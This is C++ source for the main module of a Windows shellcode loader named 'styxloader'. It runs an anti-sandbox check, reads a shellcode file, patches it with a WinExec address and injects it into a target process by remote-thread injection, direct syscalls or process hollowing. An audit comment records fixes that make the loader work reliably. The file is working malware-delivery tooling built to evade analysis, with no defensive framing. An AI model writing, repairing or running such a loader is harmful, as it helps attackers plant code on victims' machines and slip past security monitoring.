#include "styxloader/sandbox_check.hpp"
#include "styxloader/shellcode.hpp"
#include "styxloader/direct_syscall.hpp"
#include "styxloader/hollow_injector.hpp"
#include "styxloader/simple_injector.hpp"

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>

// Main function of the modular loader.
//
// Usage:
//   main_loader.exe <mode> <target> <shellcode.bin>
//   Modes:
//     simple  - basic CreateRemoteThread injection (target = PID)
//     direct  - direct syscalls injection (target = PID)
//     hollow  - process hollowing (target = path to legitimate EXE)
//
// Audit note: the original MainLoader.cpp had three architectural problems
// fixed here:
//   1. Used '#include "../modules/X.cpp"' which dragged 3 extra int main()
//      definitions into the same translation unit, causing LNK2005.
//      Now we include the proper .hpp public headers.
//   2. The 'simple' mode was a stub ('// ... (similar code to
//      SimpleInjector)') — never actually called SimpleInject. Now it
//      calls styxloader::SimpleInject().
//   3. std::stoi(targetProcess) was called without try/catch — a non-
//      numeric 'target' (e.g. 'explorer.exe' passed by mistake to direct
//      mode) would throw std::invalid_argument unhandled and crash the
//      loader. Now wrapped in try/catch with a useful error message.
int main(int argc, char* argv[]) {
    // Step 1: Sandbox check at startup
    styxloader::CheckAndAbortIfSandbox();

    if (argc < 4) {
        std::cout << "Usage: main_loader.exe <mode> <target> <shellcode.bin>" << std::endl;
        std::cout << "Modes: simple (basic injection, target=PID), "
                     "direct (direct syscalls, target=PID), "
                     "hollow (process hollowing, target=EXE path)" << std::endl;
        return 1;
    }

    std::string mode = argv[1];
    std::string target = argv[2];
    std::string shellcodePath = argv[3];

    // Read shellcode
    auto shellcode = styxloader::ReadShellcode(shellcodePath.c_str());
    if (shellcode.empty()) {
        std::cout << "Error reading shellcode." << std::endl;
        return 1;
    }

    // Patch shellcode with the runtime-resolved WinExec address (commit 6).
    // The shellcode.asm layout reserves the first 8 bytes for this address;
    // the code at offset 8+ loads it via RIP-relative addressing.
    // For 'hollow' mode, the patching happens inside ProcessHollowing
    // (because that function re-reads the file itself); skip it here.
    if (mode == "simple" || mode == "direct") {
        if (!styxloader::PatchShellcodeWinExec(shellcode)) {
            std::cout << "Error: failed to patch shellcode with WinExec address. "
                         "Cannot proceed — the shellcode would call an invalid address." << std::endl;
            return 1;
        }
    }

    bool success = false;
    if (mode == "simple" || mode == "direct") {
        // simple and direct modes both take a PID as target
        DWORD pid = 0;
        try {
            pid = static_cast<DWORD>(std::stoul(target));
        } catch (const std::exception&) {
            std::cout << "Error: target '" << target
                      << "' is not a valid PID for mode '" << mode
                      << "'. Use 'hollow' mode with an EXE path instead." << std::endl;
            return 1;
        }

        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                      PROCESS_CREATE_THREAD, FALSE, pid);
        if (!hProcess) {
            std::cout << "Error opening process PID " << pid
                      << " (GetLastError=" << GetLastError() << ")." << std::endl;
            return 1;
        }

        if (mode == "simple") {
            success = styxloader::SimpleInject(hProcess, shellcode.data(), shellcode.size());
        } else {
            success = styxloader::DirectInject(hProcess, shellcode.data(), shellcode.size());
        }
        CloseHandle(hProcess);
    } else if (mode == "hollow") {
        success = styxloader::ProcessHollowing(target.c_str(), shellcodePath.c_str());
    } else {
        std::cout << "Unrecognized mode '" << mode << "'. Use simple, direct, or hollow." << std::endl;
        return 1;
    }

    if (success) {
        std::cout << "Injection successful with mode: " << mode << std::endl;
    } else {
        std::cout << "Injection error." << std::endl;
    }

    return success ? 0 : 1;
}
